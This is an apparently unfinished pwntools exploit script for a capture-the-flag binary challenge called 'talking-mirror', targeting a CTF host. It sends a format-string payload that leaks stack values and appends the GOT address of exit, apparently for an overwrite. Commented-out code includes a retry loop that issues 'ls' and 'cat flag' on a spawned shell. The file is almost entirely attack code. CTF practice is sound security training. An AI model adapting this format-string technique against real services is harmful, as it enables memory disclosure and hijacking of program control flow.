#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('./challenge_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*0x00000000004012e2
        b*vuln+46
        c
        ''')
        sleep(1)


# 0x63
# ovw
def main():
    
    GDB()
    load = flat(
        b'%57$p %57$s %18$p %18$s'
    )
    # 0x401216
    # load = load.ljust(0x18, b'A')  
    load += flat(
        exe.got.exit,
        # 0x400a09,
        # exe.got.exit + 1
        # 0x400a09 + 1
    )
    # load = load.ljust(0x58 , b'A')
    # input()
    sla(b'shall repeat it.\n', load)

    # for i in range(50):
    #     leak = p.recvuntil(b'|')
if args.REMOTE:
    p = remote('talking-mirror.ctf.prgy.in', 1337, ssl=True)
else:
    p = process([exe.path])
main()

a = 0
# while True:
# # while ( a < 1):
#     a+=1
#     try:
#         info(f'attemp: {a}')
#         if args.REMOTE:
#             p = remote('talking-mirror.ctf.prgy.in', 1337, ssl=True)
#         else:
#             p = process([exe.path])
#         main()
#         sl(b'ls')
#         sl(b'cat flag')
#         sl('cat flag.txt')
#         output = p.recv(timeout=5)
#         # print(output)
#         if b'{' in output:
#             print(output)
#             p.interactive()
#             break
#         else:
#             p.close()
#             continue
#     except EOFError:
#         p.close()
#         continue
p.interactive()

